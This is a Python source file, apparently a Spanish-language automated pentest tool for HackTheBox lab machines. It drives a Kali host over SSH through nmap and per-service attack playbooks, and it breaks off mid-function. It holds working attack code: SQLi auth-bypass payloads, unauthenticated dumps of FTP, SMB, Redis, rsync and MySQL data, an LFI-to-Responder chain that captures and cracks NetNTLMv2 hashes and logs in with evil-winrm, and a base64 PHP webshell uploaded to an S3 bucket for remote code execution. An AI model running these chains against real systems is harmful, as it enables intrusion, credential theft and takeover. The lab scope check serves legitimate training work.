"""
DEVOPS — Lab Hunter
Pentest automático de máquinas de laboratorio (HackTheBox) vía SSH a una Kali.
Pega una IP -> comprueba/levanta la VPN -> ping -> nmap -> playbook por servicio -> flag.

SOLO para rangos de laboratorio autorizados (HTB). Uso educativo en máquinas propias.
"""
import asyncio
import ipaddress
import re
import socket
import time

import paramiko

from config_manager import load_config

# Rangos permitidos: HTB (10.10.x VPN/labs, 10.129.x máquinas). Guardarraíl de scope.
LAB_RANGES = ["10.10.0.0/16", "10.129.0.0/16"]

FLAG_RE = re.compile(r"\b([a-f0-9]{32})\b")


def _now() -> str:
    return time.strftime("%H:%M:%S")


def _step(steps, fase, accion, resultado, salida="", hallazgos=None):
    """Añade un evento a la línea de tiempo (evidencia + aprendizaje)."""
    steps.append({
        "paso": len(steps) + 1,
        "ts": _now(),
        "fase": fase,
        "accion": accion,
        "resultado": resultado,
        "salida": salida.strip()[-4000:],
        "hallazgos": hallazgos or [],
    })


def in_scope(target: str) -> bool:
    try:
        ip = ipaddress.ip_address(target.strip())
    except ValueError:
        return False
    return any(ip in ipaddress.ip_network(r) for r in LAB_RANGES)


def _ssh():
    cfg = load_config().get("kali_ssh", {})
    if not cfg.get("host") or not cfg.get("user"):
        raise RuntimeError("Kali SSH sin configurar (config.json > kali_ssh).")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        cfg["host"], port=int(cfg.get("port", 22)), username=cfg["user"],
        password=cfg.get("password") or None,
        key_filename=cfg.get("key_path") or None,
        timeout=10, banner_timeout=15, auth_timeout=15,
        look_for_keys=False, allow_agent=False,   # imprescindible: si no, "No existing session"
    )
    return client


def _run(client, cmd, timeout=120) -> str:
    """Ejecuta en la Kali por SSH. NUNCA propaga: si el comando se cuelga más del
    timeout, paramiko lanza socket.timeout (== TimeoutError, str() vacío en 3.10+)
    al leer el canal. Lo convertimos en un MARCADOR de texto para que ni los
    playbooks ni el cerebro IA se mueran por un comando lento (gobuster, curl que
    cuelga, etc.). El que llama reacciona al marcador, no a una excepción ciega."""
    try:
        _, o, e = client.exec_command(cmd, timeout=timeout)
        return (o.read() + e.read()).decode(errors="replace")
    except (socket.timeout, TimeoutError):
        return f"[TIMEOUT: el comando excedió {timeout}s sin terminar]"
    except Exception as ex:
        return f"[ERROR exec: {type(ex).__name__}: {ex}]"


def _sudo_pw() -> str:
    return load_config().get("kali_ssh", {}).get("password", "")


def ensure_vpn(client, steps) -> bool:
    """Comprueba tun0; si no está, levanta openvpn con el .ovpn del escritorio."""
    out = _run(client, "ip -br a | grep tun || echo NO_VPN")
    if "tun" in out and "NO_VPN" not in out:
        vip = re.search(r"(10\.10\.\d+\.\d+)", out)
        _step(steps, "VPN", "comprobar tun0", "conectada",
              out, [f"tun0={vip.group(1)}"] if vip else [])
        return True
    ovpn = _run(client, "find /home -iname '*.ovpn' 2>/dev/null | head -1").strip()
    if not ovpn:
        _step(steps, "VPN", "buscar .ovpn", "no encontrado",
              "Sube tu .ovpn de HTB al escritorio de la Kali.")
        return False
    _run(client, f"echo {_sudo_pw()} | sudo -S bash -c "
                 f"'pkill openvpn 2>/dev/null; nohup openvpn --config \"{ovpn}\" "
                 f"--daemon >/tmp/htbvpn.log 2>&1'")
    for _ in range(25):   # ~75s: el primer connect a HTB puede tardar 40-60s
        time.sleep(3)
        out = _run(client, "ip -br a | grep tun || echo NO")
        if "tun" in out and "NO" not in out:
            vip = re.search(r"(10\.10\.\d+\.\d+)", out)
            _step(steps, "VPN", "levantar openvpn", "conectada",
                  out, [f"tun0={vip.group(1)}"] if vip else [])
            return True
    _step(steps, "VPN", "levantar openvpn", "fallo: tun0 no subió")
    return False


# ----------------------------- PLAYBOOKS -----------------------------

def pb_telnet(client, target, steps) -> list:
    """Tier 0 estilo Meow: login root sin contraseña por telnet -> flag."""
    script = (
        "set timeout 30\n"
        f"spawn telnet {target}\n"
        'expect "login:"\n'
        'send "root\\r"\n'
        'expect "#"\n'
        'send "cat /root/flag.txt /root/root.txt /home/*/user.txt 2>/dev/null\\r"\n'
        'expect "#"\n'
        'send "id\\r"\n'
        'expect "#"\n'
        'send "exit\\r"\n'
        "expect eof"
    )
    out = _run(client, "expect -c '" + script + "'", timeout=60)
    flags = list(dict.fromkeys(FLAG_RE.findall(out)))
    hall = [f"flag={f}" for f in flags]
    if "uid=0" in out:
        hall.append("shell root")
    _step(steps, "EXPLOIT", "telnet login root (sin contraseña)",
          "acceso root + flag" if flags else "sin flag", out, hall)
    return flags


def pb_ftp(client, target, steps) -> list:
    """Tier 0 estilo Fawn: FTP anónimo -> lista y descarga archivos -> flag/creds."""
    user = "anonymous"
    listing = _run(client,
        f"curl -s --connect-timeout 10 ftp://{user}:{user}@{target}/", timeout=30)
    if not listing.strip():
        _step(steps, "ENUM", "FTP login anónimo", "sin acceso o directorio vacío", listing)
        return []
    files = [m.strip() for m in re.findall(r"(\S+)\s*$", listing, re.M)]
    _step(steps, "ENUM", "FTP login anónimo", "acceso OK", listing, [f"archivos={files}"])
    flags = []
    for fn in files:
        if not fn or fn in (".", ".."):
            continue
        content = _run(client,
            f"curl -s --connect-timeout 10 ftp://{user}:{user}@{target}/{fn}", timeout=30)
        found = FLAG_RE.findall(content)
        if found:
            flags += found
            hall = [f"flag en {fn}={found[0]}"]
        else:
            hall = [f"{fn}: {content.strip()[:200]}"] if content.strip() else []
        _step(steps, "LOOT", f"descargar {fn}", "flag!" if found else "leído", content, hall)
    return list(dict.fromkeys(flags))


def pb_smb(client, target, steps) -> list:
    """Estilo Dancing: SMB con sesión nula -> shares no-admin -> vuelca y caza flags."""
    # 1) Listar shares con sesión nula (-N) en formato parseable (-g): "Disk|nombre|comentario"
    listing = _run(client, f"smbclient -N -g -L //{target}/ 2>/dev/null", timeout=40)
    shares = [ln.split("|")[1].strip()
              for ln in listing.splitlines()
              if ln.strip().startswith("Disk|") and len(ln.split("|")) >= 2]
    DEFAULT = {"ADMIN$", "C$", "IPC$", "PRINT$", "NETLOGON", "SYSVOL"}
    custom = [s for s in shares if s and s.upper() not in DEFAULT]
    _step(steps, "ENUM", "SMB listar shares (sesión nula)",
          "acceso OK" if shares else "sin sesión nula", listing,
          [f"shares={shares}", f"no-admin={custom}"])
    if not custom:
        return []

    flags = []
    for sh in custom:
        tarf = "/tmp/lh_" + re.sub(r"[^A-Za-z0-9]", "_", sh) + ".tar"
        # Volcar TODO el share a un tar y leer su contenido recursivo de una sola vez.
        names = _run(client,
            f"rm -f {tarf}; smbclient -N //{target}/'{sh}' -Tc {tarf} '*' 2>/dev/null; "
            f"tar tf {tarf} 2>/dev/null", timeout=90)
        dump = _run(client, f"tar xOf {tarf} 2>/dev/null", timeout=60)
        found = FLAG_RE.findall(dump)
        accesible = bool(names.strip())
        hall = [f"flag={found[0]}"] if found else []
        if accesible:
            hall.insert(0, "ficheros=" + ", ".join(
                n.strip() for n in names.splitlines() if n.strip())[:300])
        _step(steps, "LOOT" if found else "ENUM",
              f"SMB volcar share '{sh}' (anónimo)",
              "flag!" if found else ("acceso OK" if accesible else "sin acceso"),
              names + "\n---\n" + dump, hall)
        flags += found
    return list(dict.fromkeys(flags))


def pb_redis(client, target, steps) -> list:
    """Estilo Redeemer: Redis SIN auth -> vuelca todas las claves -> caza flags."""
    keys_out = _run(client, f"redis-cli -h {target} -t 8 keys '*' 2>&1", timeout=30)
    if "refused" in keys_out or "Could not connect" in keys_out:
        _step(steps, "ENUM", "Redis sin auth", "sin acceso", keys_out)
        return []
    if "NOAUTH" in keys_out:
        _step(steps, "ENUM", "Redis sin auth", "requiere contraseña", keys_out)
        return []
    keys = [k.strip() for k in keys_out.splitlines()
            if k.strip() and not k.strip().startswith("(")]
    dump = ""
    for k in keys[:50]:
        v = _run(client, f"redis-cli -h {target} -t 8 get '{k}' 2>&1", timeout=15)
        dump += f"{k} = {v.strip()}\n"
    flags = list(dict.fromkeys(FLAG_RE.findall(dump) + FLAG_RE.findall(" ".join(keys))))
    _step(steps, "LOOT" if flags else "ENUM", "Redis volcar claves (sin auth)",
          "flag!" if flags else "claves leídas", dump or keys_out,
          [f"claves={keys}"] + ([f"flag={flags[0]}"] if flags else []))
    return flags


def pb_rsync(client, target, steps) -> list:
    """Estilo Synced: rsync SIN auth -> lista módulos -> baja y caza flags."""
    mods_out = _run(client, f"rsync --contimeout=8 rsync://{target}/ 2>&1", timeout=30)
    mods = [ln.split()[0] for ln in mods_out.splitlines()
            if ln.strip() and not ln.lower().startswith(("rsync error", "@error", "rsync:"))]
    if not mods:
        _step(steps, "ENUM", "rsync listar módulos (sin auth)", "sin acceso", mods_out)
        return []
    _step(steps, "ENUM", "rsync listar módulos (sin auth)", "acceso OK", mods_out,
          [f"módulos={mods}"])
    flags = []
    for m in mods:
        d = "/tmp/lh_rsync_" + re.sub(r"[^A-Za-z0-9]", "_", m)
        dump = _run(client,
            f"rm -rf {d}; mkdir -p {d}; "
            f"rsync -a --contimeout=8 rsync://{target}/'{m}'/ {d}/ 2>&1; "
            f"echo '---FILES---'; find {d} -type f 2>/dev/null; "
            f"echo '---GREP---'; grep -rhoE '[a-f0-9]{{32}}' {d} 2>/dev/null", timeout=120)
        found = FLAG_RE.findall(dump)
        flags += found
        _step(steps, "LOOT" if found else "ENUM", f"rsync bajar módulo '{m}'",
              "flag!" if found else "bajado", dump, [f"flag={found[0]}"] if found else [])
    return list(dict.fromkeys(flags))


def pb_mysql(client, target, steps) -> list:
    """Estilo Sequel: MySQL/MariaDB root SIN contraseña -> vuelca bases -> caza flags."""
    # El cliente de la Kali es MariaDB: usa --skip-ssl (NO el --ssl-mode de MySQL),
    # si no, el handshake aborta con ERROR 2026 "SSL is required...".
    # OJO con --connect-timeout: Sequel tarda >8s en completar el handshake recién
    # spawneada; un timeout corto da ERROR 2013 / system error 110 (ETIMEDOUT) en
    # falso. 30s deja margen de sobra (validado: con 8s fallaba, sin él/30s entra).
    base = f"mysql -h {target} -u root --skip-ssl --connect-timeout=30 -N"
    # Aun así, una caja recién arrancada puede no responder al primer intento:
    # reintento con backoff antes de rendirse.
    show = ""
    for intento in range(4):
        show = _run(client, f"{base} -e 'show databases;' 2>&1", timeout=45)
        if not any(s in show for s in ("ERROR 2013", "Lost connection", "Can't connect", "[TIMEOUT")):
            break
        if intento < 3:
            _step(steps, "ENUM", "MySQL conexión",
                  f"handshake falló (intento {intento + 1}/4), reintento con backoff", show.strip())
            _run(client, f"sleep {3 * (intento + 1)}", timeout=20)
    if "Access denied" in show:
        _step(steps, "ENUM", "MySQL root sin contraseña", "acceso denegado (requiere pass)", show)
        return []
    dbs = [d.strip() for d in show.splitlines() if d.strip() and "ERROR" not in d and "mysql:" not in d]
    if not dbs:
        _step(steps, "ENUM", "MySQL root sin contraseña", "sin acceso", show)
        return []
    SYS = {"information_schema", "mysql", "performance_schema", "sys"}
    custom = [d for d in dbs if d.lower() not in SYS]
    _step(steps, "ENUM", "MySQL root sin contraseña", "acceso OK", show,
          [f"bases={dbs}", f"no-sistema={custom}"])
    flags, dump = [], ""
    for db in custom:
        tbls = _run(client, f"{base} -e 'show tables;' '{db}' 2>&1", timeout=30)
        for t in [x.strip() for x in tbls.splitlines() if x.strip() and "ERROR" not in x]:
            rows = _run(client, f"{base} -e 'select * from `{t}`;' '{db}' 2>&1", timeout=30)
            dump += f"[{db}.{t}]\n{rows}\n"
            flags += FLAG_RE.findall(rows)
    flags = list(dict.fromkeys(flags))
    _step(steps, "LOOT" if flags else "ENUM", "MySQL volcar bases no-sistema",
          "flag!" if flags else "leído", dump, [f"flag={flags[0]}"] if flags else [])
    return flags


# Wordlist de Kali siempre presente (paquete dirb). Para fuzzing de rutas web.
WEB_WORDLIST = "/usr/share/wordlists/dirb/common.txt"
# Payloads clásicos de bypass de autenticación por SQLi (vector típico de cajas web
# tipo Appointment). Login con ' OR '1'='1 -> entra sin credenciales válidas.
_SQLI_BYPASS = ["admin' or '1'='1' -- -", "admin' or 1=1 -- -", "' or ''='", "admin'#"]


def _tun_ip(client) -> str:
    """IP de la Kali en la VPN (tun0) — la que oirá Responder cuando la víctima haga SMB."""
    out = _run(client, "ip -4 -o a show tun0 2>/dev/null")
    m = re.search(r"(10\.10\.\d+\.\d+)", out)
    return m.group(1) if m else ""


# Parámetros típicos de LFI en cajas web tipo Unika (index.php?page=...).
_LFI_PARAMS = ["page", "file", "lang", "view", "include", "path", "p"]
_TRAVERSAL = "../" * 10   # traversal hondo: sirve esté donde esté la raíz web


def _detect_vhost(info: str):
    """Saca un vhost *.htb de un meta-refresh / Location / enlace de la portada, o —si
    no hay redirección— de cualquier mención .htb del cuerpo (p.ej. el email
    mail@thetoppers.htb de la caja Three)."""
    m = re.search(r"https?://([A-Za-z0-9.-]+\.htb)", info)
    if m:
        return m.group(1)
    m = re.search(r"\b([A-Za-z0-9][A-Za-z0-9-]*\.htb)\b", info)
    return m.group(1) if m else None


def _fix_vhost_hosts(client, target, vhost, steps):
    """Apunta el vhost a la IP ACTUAL en /etc/hosts (borra entradas viejas primero:
    las IPs de HTB cambian en cada spawn y una entrada caduca resuelve a IP muerta)."""
    pw = _sudo_pw()
    _run(client,
         f"echo {pw} | sudo -S bash -c \"sed -i '\\|{vhost}|d' /etc/hosts; "
         f"printf '%s\\t%s\\n' '{target}' '{vhost}' >> /etc/hosts\"", timeout=20)
    check = _run(client, f"grep {vhost} /etc/hosts")
    _step(steps, "ENUM", f"vhost {vhost} → /etc/hosts",
          "apuntado a la IP actual", check, [f"{vhost} -> {target}"])


def _lfi_to_winrm(client, target, base, steps) -> list:
    """Cadena tipo Unika: LFI en index.php?page= (Windows) -> Responder captura el
    hash NetNTLMv2 al disparar el LFI contra una ruta UNC a nuestra Kali -> john lo
    crackea con rockyou -> evil-winrm (5985) -> flag. Solo se dispara si CONFIRMA el
    LFI leyendo windows/win.ini, así no molesta a cajas web normales."""
    ck = "-k " if base.startswith("https") else ""
    # 1) Confirmar LFI sobre Windows probando parámetros típicos.
    prefix = prm = None
    for p in _LFI_PARAMS:
        for cand in (f"index.php?{p}=", f"?{p}="):
            test = _run(client,
                f"curl -s {ck}-m 10 '{base}/{cand}{_TRAVERSAL}windows/win.ini'", timeout=20)
            if "16-bit app support" in test or "[extensions]" in test:
                prefix, prm = f"{base}/{cand}", p
                _step(steps, "EXPLOIT", f"LFI confirmado ({cand}…)",
                      "lee ficheros de Windows", test[:500],
                      [f"param={p}", "objetivo=Windows"])
                break
        if prefix:
            break
    if not prefix:
        return []

    # 2) IP de tun0 + arrancar Responder DESACOPLADO (setsid, fds redirigidos: si no,
    #    muere al cerrar el canal SSH). Limpio el log viejo del target antes.
    atk = _tun_ip(client)
    if not atk:
        _step(steps, "IA", "LFI→Responder", "sin IP de tun0; no se puede capturar hash")
        return []
    pw = _sudo_pw()
    hashfile = f"/usr/share/responder/logs/SMB-NTLMv2-SSP-{target}.txt"
    _run(client, f"echo {pw} | sudo -S bash -c 'pkill -f responder 2>/dev/null; "
                 f"rm -f {hashfile}'; sleep 1", timeout=20)
    _run(client, f"echo {pw} | sudo -S bash -c 'setsid responder -I tun0 -dwv "
                 f"</dev/null >/tmp/lh_resp.log 2>&1 &'", timeout=20)
    time.sleep(7)
    # 3) Disparar el LFI hacia una ruta UNC a la Kali -> Windows se autentica por SMB.
    for share in ("x", "share", "a"):
        _run(client, f"curl -s {ck}-m 6 '{prefix}//{atk}/{share}' >/dev/null 2>&1", timeout=15)
        time.sleep(2)
    time.sleep(4)
    hraw = _run(client, f"cat {hashfile} 2>/dev/null")
    _run(client, f"echo {pw} | sudo -S pkill -f responder 2>/dev/null; echo k", timeout=20)
    hashes = [l.strip() for l in hraw.splitlines()
              if re.match(r"^[^:]+::[^:]+:[0-9a-fA-F]{16,}:", l.strip())]
    if not hashes:
        _step(steps, "IA", "Responder capturar NetNTLMv2",
              "no se capturó hash", hraw[:400])
        return []
    h0 = hashes[0]
    user = h0.split("::")[0]
    _step(steps, "LOOT", "Responder capturó NetNTLMv2", f"hash de {user}",
          h0[:160] + "…", [f"usuario={user}"])

    # 4) Crackear el NetNTLMv2 con john + rockyou.
    _run(client, f"printf '%s\\n' '{h0}' > /tmp/lh_hash.txt", timeout=15)
    _run(client, "john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt "
                 "/tmp/lh_hash.txt 2>&1", timeout=240)
    show = _run(client, "john --show --format=netntlmv2 /tmp/lh_hash.txt 2>&1", timeout=30)
    mpw = re.search(rf"^{re.escape(user)}:([^:]+):", show, re.M)
    if not mpw:
        _step(steps, "EXPLOIT", "john crackear NetNTLMv2",
              "no se crackeó con rockyou", show[:300])
        return []
    cred = mpw.group(1)
    _step(steps, "EXPLOIT", "john crackeó la contraseña", f"{user}:{cred}",
          show[:160], [f"cred={user}:{cred}"])

    # 5) evil-winrm (5985) -> leer flags. Barras normales en rutas Windows: printf
    #    interpreta \f, \t,… y rompería C:\Users\... ; PowerShell acepta C:/Users/...
    psc = ("Get-Content C:/Users/*/Desktop/*.txt,C:/Users/*/Documents/*.txt "
           "-ErrorAction SilentlyContinue\nexit\n")
    out = _run(client,
        f"printf '%s' '{psc}' | evil-winrm -i {target} -u '{user}' -p '{cred}' 2>&1",
        timeout=120)
    # evil-winrm intercala secuencias ANSI (p.ej. \x1b[1G) pegadas al texto; si no se
    # limpian, una letra de la secuencia rompe el \b de FLAG_RE y la flag no matchea.
    clean = re.sub(r"\x1b\[[0-9;?]*[A-Za-z]", "", out)
    flags = list(dict.fromkeys(FLAG_RE.findall(clean)))
    _step(steps, "LOOT" if flags else "EXPLOIT", f"evil-winrm {user}@{target}:5985",
          "flag!" if flags else "conectado sin flag (revisa rutas)", out[-1500:],
          [f"flag={flags[0]}"] if flags else [])
    return flags


# Webshell PHP mínima en base64 (evita el infierno de comillas con $_GET al pasarla
# por SSH desde Windows). Decodifica a: <?php system($_GET['c']); ?>
_WEBSHELL_B64 = "PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="
# El S3 falso de estas cajas acepta CUALQUIER credencial; con env dummy basta.
_AWSENV = "AWS_ACCESS_KEY_ID=x AWS_SECRET_ACCESS_KEY=x AWS_DEFAULT_REGION=us-east-1"


def _s3_bucket_rce(client, target, vhost, steps) -> list:
    """Cadena tipo Three: la web sirve desde un bucket de un S3 falso (s3.<vhost>) que
    acepta credenciales cualquiera. Si un bucket ES la raíz web, subes una webshell PHP
    por 'aws s3 cp' y tienes RCE -> flag. Solo se dispara si el endpoint S3 responde su
    firma típica ({"status": "running"} / XML de S3), para no molestar a webs normales."""
    s3host = f"s3.{vhost}"
    pw = _sudo_pw()
    # 1) Apuntar s3.<vhost> a la IP ACTUAL (las IPs HTB cambian en cada spawn).
    _run(client,
         f"echo {pw} | sudo -S bash -c \"sed -i '\\|{s3host}|d' /etc/hosts; "
         f"printf '%s\\t%s\\n' '{target}' '{s3host}' >> /etc/hosts\"", timeout=20)
    # 2) ¿Hay un S3 falso escuchando?
    sig = _run(client, f"curl -s -m 12 http://{s3host}/", timeout=20)
    low = sig.lower()
    if "running" not in low and "listallmybuckets" not in low and "<bucket" not in low:
        return []
    ep = f"--endpoint-url=http://{s3host}"
    _step(steps, "ENUM", f"S3 falso en {s3host}", "responde firma S3", sig[:300])
    # 3) Listar buckets con credenciales dummy.
    buckets_raw = _run(client, f"{_AWSENV} aws {ep} s3 ls 2>&1", timeout=30)
    buckets = [m for m in re.findall(r"(?m)\s(\S+)\s*$", buckets_raw)
               if "." in m or "-" in m]
    _step(steps, "ENUM", f"aws s3 ls @ {s3host}",
          f"{len(buckets)} bucket(s)", buckets_raw, [f"buckets={buckets}"])
    if not buckets:
        return []
    # 4) Buscar el bucket que es la raíz web (index.php/.htaccess/index.html).
    for b in buckets:
        ls = _run(client, f"{_AWSENV} aws {ep} s3 ls s3://{b} 2>&1", timeout=30)
        if not re.search(r"index\.php|index\.html|\.htaccess", ls):
            continue
        _step(steps, "EXPLOIT", f"bucket '{b}' = raíz web",
              "subo webshell PHP", ls, [f"bucket={b}"])
        # 5) Montar y subir la webshell.
        _run(client, f"echo {_WEBSHELL_B64} | base64 -d > /tmp/lh.php", timeout=15)
        _run(client, f"{_AWSENV} aws {ep} s3 cp /tmp/lh.php s3://{b}/lh.php 2>&1", timeout=30)
        time.sleep(3)
        # 6) RCE: la webshell se sirve por Apache; probar hosts plausibles.
        for h in dict.fromkeys([target, vhost, b]):
            rce = _run(client,
                f'curl -s -m 12 -G --data-urlencode "c=id" http://{h}/lh.php', timeout=20)
            if "uid=" not in rce:
                continue
            # 7) Leer la flag (rutas típicas + búsqueda acotada). -G url-encode lo hace curl.
            loot = _run(client,
                'curl -s -m 25 -G --data-urlencode '
                '"c=cat /var/www/flag.txt /var/www/html/flag.txt /home/*/user.txt '
                '/root/root.txt 2>/dev/null; find / -maxdepth 5 \\( -name flag.txt -o '
                f'-name user.txt \\) 2>/dev/null | head" http://{h}/lh.php', timeout=45)
            flags = list(dict.fromkeys(FLAG_RE.findall(loot)))
            # 8) Limpieza best-effort del bucket (la copia local muere en el reset).
            _run(client, f"{_AWSENV} aws {ep} s3 rm s3://{b}/lh.php 2>&1; rm -f /tmp/lh.php",
                 timeout=20)
            _step(steps, "LOOT" if flags else "EXPLOIT",
                  f"RCE webshell (www-data) @ {h}/lh.php",
                  "flag!" if flags else "RCE OK sin flag (revisa rutas)",
                  (rce + "\n" + loot)[:1500], [f"flag={flags[0]}"] if flags else [])
            if flags:
                return flags
        _run(client, f"{_AWSENV} aws {ep} s3 rm s3://{b}/lh.php 2>&1", timeout=20)
    return []


def _http_scan(client, target, steps, scheme) -> list:
    """Estilo Appointment: web (80/443) -> fingerprint + gobuster + caza de flags +
    intento de SQLi auth bypass. Lo que no caiga aquí queda servido para el cerebro."""
    base = f"{scheme}://{target}"
    ck = "-k " if scheme == "https" else ""    # https: saltar verificación TLS del lab

    # 1) Fingerprint + portada + robots.txt en una sola pasada.
    info = _run(client,
        f"whatweb -a1 {base} 2>/dev/null; echo '---INDEX---'; "
        f"curl -s {ck}-m 15 -iL {base}/; echo '---ROBOTS---'; "
        f"curl -s {ck}-m 10 {base}/robots.txt", timeout=70)
    flags = list(dict.fromkeys(FLAG_RE.findall(info)))
    has_login = bool(re.search(r'type=["\']?password|name=["\']?password', info, re.I))
    _step(steps, "ENUM", f"HTTP fingerprint {base}",
          "flag!" if flags else ("login detectado" if has_login else "página leída"),
          info, [f"flag={flags[0]}"] if flags
          else (["formulario de login en /"] if has_login else []))
    if flags:
        return flags

    # 1b) ¿La portada redirige a un vhost *.htb? Apúntalo a la IP actual en /etc/hosts
    #     y a partir de aquí trabaja contra el vhost (la app suele exigirlo).
    vhost = _detect_vhost(info)
    if vhost and vhost not in base:
        _fix_vhost_hosts(client, target, vhost, steps)
        base = f"{scheme}://{vhost}"

    # 1c) Cadena LFI -> Responder -> john -> evil-winrm (cajas Windows tipo Unika).
    #     Si confirma LFI y crackea el hash, owna la caja sin tocar gobuster/SQLi.
    lfi_flags = _lfi_to_winrm(client, target, base, steps)
    if lfi_flags:
        return list(dict.fromkeys(flags + lfi_flags))

    # 1d) Cadena S3-bucket-RCE (cajas tipo Three): si la web revela un dominio .htb con
    #     un S3 falso cuyo bucket es la raíz web, sube webshell -> RCE -> flag.
    if vhost:
        s3_flags = _s3_bucket_rce(client, target, vhost, steps)
        if s3_flags:
            return list(dict.fromkeys(flags + s3_flags))

    # 2) Descubrimiento de rutas con gobuster (silencioso, acotado).
    paths_out = _run(client,
        f"gobuster dir -u {base} -w {WEB_WORDLIST} -t 30 -q --no-error -k 2>/dev/null "
        f"| head -80", timeout=200)
    # gobuster -q saca la ruta SIN barra inicial ni URL ("css", "index.php"); la
    # normalizamos a "/css". Saltamos el ruido .ht* que siempre da 403.
    paths = re.findall(r"(?m)^\s*(/?\S+)\s+\(Status:\s*(\d+)\)", paths_out)
    interesting = list(dict.fromkeys(
        "/" + p.lstrip("/") for p, s in paths
        if s in ("200", "301", "302", "401", "403")
        and not p.lstrip("/").startswith(".ht")))
    _step(steps, "ENUM", f"gobuster rutas {base}",
          "rutas encontradas" if interesting else "sin rutas (marcador/timeout)",
          paths_out, [f"rutas={interesting[:25]}"] if interesting else [])

    # 3) Curl de rutas interesantes -> caza flags y detecta más logins.
    for p in interesting[:15]:
        body = _run(client, f"curl -s {ck}-m 12 -L {base}{p}", timeout=25)
        found = FLAG_RE.findall(body)
        if found:
            flags += found
            _step(steps, "LOOT", f"GET {p}", "flag!", body, [f"flag={found[0]}"])
        if not has_login and re.search(r'type=["\']?password|<form', body, re.I):
            has_login = True

    # 4) SQLi auth bypass en / y rutas con pinta de login.
    if has_login:
        login_paths = list(dict.fromkeys(
            ["/"] + [p for p in interesting
                     if re.search(r"log|admin|sign|auth|user", p, re.I)]))[:6]
        last = ""
        for lp in login_paths:
            for pay in _SQLI_BYPASS:
                # Comillas DOBLES: los payloads contienen ' (comilla simple); con
                # comillas simples el shell de la Kali rompería el quoting y el dato
                # llegaría destrozado. Ninguno de los payloads contiene " ni $ ni `.
                resp = _run(client,
                    f"curl -s {ck}-m 12 -L -X POST "
                    f'--data-urlencode "username={pay}" '
                    f'--data-urlencode "password={pay}" {base}{lp}', timeout=25)
                last = resp
                found = FLAG_RE.findall(resp)
                if found:
                    flags += found
                    _step(steps, "EXPLOIT", f"SQLi auth bypass POST {lp}",
                          "flag!", resp, [f"payload={pay}", f"flag={found[0]}"])
                    return list(dict.fromkeys(flags))
        _step(steps, "EXPLOIT", "SQLi auth bypass (login)",
              "probado sin flag directa — sigue el cerebro IA", last,
              ["formularios de login probados con OR 1=1; revisar respuesta/redirecciones"])

    return list(dict.fromkeys(flags))


def pb_http(client, target, steps) -> list:
    return _http_scan(client, target, steps, "http")


def pb_https(client, target, steps) -> list:
    return _http_scan(client, target, steps, "https")


# servicio detectado por nmap -> playbook a ejecutar
PLAYBOOKS = {
    "telnet": pb_telnet,
    "ftp": pb_ftp,
    "microsoft-ds": pb_smb,   # 445 (Dancing y cualquier caja Windows con SMB)
    "netbios-ssn": pb_smb,    # 139
    "redis": pb_redis,        # 6379 (Redeemer)
    "rsync": pb_rsync,        # 873  (Synced)
    "mysql": pb_mysql,        # 3306 (Sequel)
    "http": pb_http,          # 80   (Appointment y cajas web)
    "http-proxy": pb_http,    # 8080
    "http-alt": pb_http,      # 8000/8888
    "https": pb_https,        # 443
    "ssl/http": pb_https,     # 443 (nmap a veces lo etiqueta así)
}


def _hunt(target: str) -> dict:
    target = target.strip()
    res = {"target": target, "status": "", "services": [], "flags": [], "steps": []}
    steps = res["steps"]

    if not in_scope(target):
        res["status"] = "rechazado"
        _step(steps, "SCOPE", "validar IP",
              "FUERA DE RANGO de laboratorio — bloqueado",
              f"Permitidos: {', '.join(LAB_RANGES)}")
        return res

    try:
        client = _ssh()
    except Exception as ex:
        res["status"] = "error"
        _step(steps, "CONEXION", "SSH a Kali", f"error: {ex}")
        return res

    try:
        if not ensure_vpn(client, steps):
            res["status"] = "sin-vpn"
            return res

        ping = _run(client, f"ping -c 2 -W 3 {target}")
        if "0% packet loss" not in ping and "0% perdidos" not in ping:
            _step(steps, "CONECTIVIDAD", "ping objetivo",
                  "sin respuesta — ¿spawneaste la máquina en HTB?", ping)
            res["status"] = "inalcanzable"
            return res
        rtt = re.search(r"=\s*[\d.]+/([\d.]+)/", ping)
        _step(steps, "CONECTIVIDAD", "ping objetivo", "vivo", ping,
              [f"rtt={rtt.group(1)}ms"] if rtt else [])

        # Recon escalonada: 1) top-1000 con -sV (rápido, cubre la mayoría).
        # 2) si NO sale ningún puerto, escalar a full -p- (servicios en puertos
        # raros fuera del top-1000, p.ej. Redis 6379 = caja Redeemer).
        nm = _run(client, f"nmap -T4 -sV --open -Pn {target}", timeout=220)
        ports = [(int(p), s) for p, s in re.findall(r"^(\d+)/tcp\s+open\s+(\S+)", nm, re.M)]
        extra = ""
        if not ports:
            disc = _run(client, f"nmap -p- --min-rate 3000 -T4 --open -Pn {target}", timeout=300)
            allp = list(dict.fromkeys(re.findall(r"^(\d+)/tcp\s+open", disc, re.M)))
            if allp:
                nm2 = _run(client, f"nmap -sV -p {','.join(allp)} --open -Pn {target}", timeout=250)
                ports = [(int(p), s) for p, s in re.findall(r"^(\d+)/tcp\s+open\s+(\S+)", nm2, re.M)]
                extra = "\n--- top-1000 vacío → full -p- ---\n" + disc + "\n--- -sV ---\n" + nm2
            else:
                extra = "\n--- full -p- (host sin puertos TCP) ---\n" + disc
        res["services"] = [{"port": p, "service": s} for p, s in ports]
        _step(steps, "RECON", "nmap -sV (top-1000)" + (" → escala a -p-" if extra else ""),
              f"{len(ports)} puerto(s) abierto(s)", nm + extra, [f"{p}/{s}" for p, s in ports])

        if not ports:
            _step(steps, "RECON", "host responde pero 0 puertos TCP",
                  "IP probablemente caducada o máquina recién arrancada",
                  "Las IPs de HTB cambian en cada spawn. Re-spawnea la máquina en HTB y "
                  "pega la IP NUEVA; o si acabas de arrancarla espera 1-2 min y reintenta.")

        ran = set()
        sin_playbook = []
        for p, svc in ports:
            key = svc.rstrip("?").lower()   # nmap a veces marca "microsoft-ds?"
            pb = PLAYBOOKS.get(key)
            if pb and pb not in ran:
                ran.add(pb)                  # 139 y 445 comparten playbook: una sola pasada
                res["flags"] += pb(client, target, steps)
            elif not pb:
                sin_playbook.append(f"{p}/{svc}")
                _step(steps, "PLAYBOOK", f"{p}/{svc}",
                      "sin playbook — lo intentará el cerebro IA")

        res["flags"] = list(dict.fromkeys(res["flags"]))

        # Cerebro autónomo: si ningún playbook conocido soltó flag (o hay servicios
        # sin playbook), que la IA lo intente leyendo el vault. Modo seguro (jaula).
        if ports and not res["flags"]:
            try:
